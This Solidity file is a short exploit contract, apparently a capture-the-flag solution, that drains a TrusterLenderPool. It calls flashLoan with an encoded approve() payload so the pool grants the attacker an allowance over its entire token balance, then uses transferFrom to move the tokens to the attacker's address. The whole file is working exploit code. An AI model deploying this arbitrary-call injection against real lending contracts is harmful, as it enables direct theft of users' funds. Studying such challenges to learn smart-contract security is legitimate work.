pragma solidity ^0.8.3;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";
import "hardhat/console.sol";

contract Attacker {
    function attack(IERC20 token, TrusterLenderPool pool, address attackerEOA) public {
        uint256 poolBalance = token.balanceOf(address(pool));
        bytes memory approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        pool.flashLoan(0, attackerEOA, address(token), approvePayload);
        token.transferFrom(address(pool), attackerEOA, poolBalance);
    }
}
